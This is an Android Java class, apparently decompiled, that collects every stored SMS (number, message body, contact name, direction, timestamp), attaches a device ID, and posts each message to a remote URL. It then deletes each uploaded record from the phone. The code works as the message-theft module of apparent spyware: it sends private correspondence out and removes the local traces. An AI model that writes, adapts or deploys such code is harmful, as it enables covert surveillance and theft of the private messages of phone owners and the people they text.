package iits.mamager;

import android.content.Context;
import iits.code.bus.SMS_BUS;
import iits.code.dao.SMS_DAO;
import iits.code.dto.SMS_DTO;
import iits.common.Constants;
import iits.common.Format;
import iits.common.HTTPWeb;
import java.util.ArrayList;

public class SMSManager {
    private static final String TAG = "SMSManager";

    private static ArrayList<String> getArrayParameterKeySMS() {
        ArrayList<String> arrKey = new ArrayList<>();
        arrKey.add("deviceid");
        arrKey.add("date");
        arrKey.add("time");
        arrKey.add("sender");
        arrKey.add("receiver");
        arrKey.add("direction");
        arrKey.add(SMS_DAO.KEY_MESSAGE);
        arrKey.add("name");
        arrKey.add("os");
        return arrKey;
    }

    private static ArrayList<String> getArrayParameterValueSMS(String deviceID, SMS_DTO sms) {
        ArrayList<String> arrValue = new ArrayList<>();
        if (deviceID.equals("") || sms == null) {
            return null;
        }
        arrValue.add(String.valueOf(deviceID));
        arrValue.add(Format.formatDate(sms.getTime()));
        arrValue.add(Format.formatTime(sms.getTime()));
        if (sms.getDirection() == 1) {
            arrValue.add(sms.getNumber());
            arrValue.add("0");
        } else {
            arrValue.add("0");
            arrValue.add(sms.getNumber());
        }
        arrValue.add(String.valueOf(sms.getDirection()));
        arrValue.add(sms.getMessage());
        arrValue.add(sms.getName());
        arrValue.add(Constants.OS);
        return arrValue;
    }

    public static void sendDataOfSMSToWebsite(Context context, String url, String deviceID) {
        try {
            ArrayList<SMS_DTO> arrSMS = SMS_BUS.getAlls(context);
            ArrayList<String> arrKey = getArrayParameterKeySMS();
            int n = arrSMS.size() - 1;
            FileManager.WriteLog(1, TAG, "n= " + String.valueOf(n + 1));
            for (int i = n; i >= 0; i--) {
                if (HTTPWeb.sendPostMethod(url, arrKey, getArrayParameterValueSMS(deviceID, arrSMS.get(i))) != null) {
                    FileManager.WriteLog(1, TAG, "send sms: " + arrSMS.get(i).getMessage());
                    SMS_BUS.delete(context, arrSMS.get(i).getID());
                    arrSMS.remove(i);
                }
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on sendDataToWebsite function: " + e.toString());
        }
    }
}
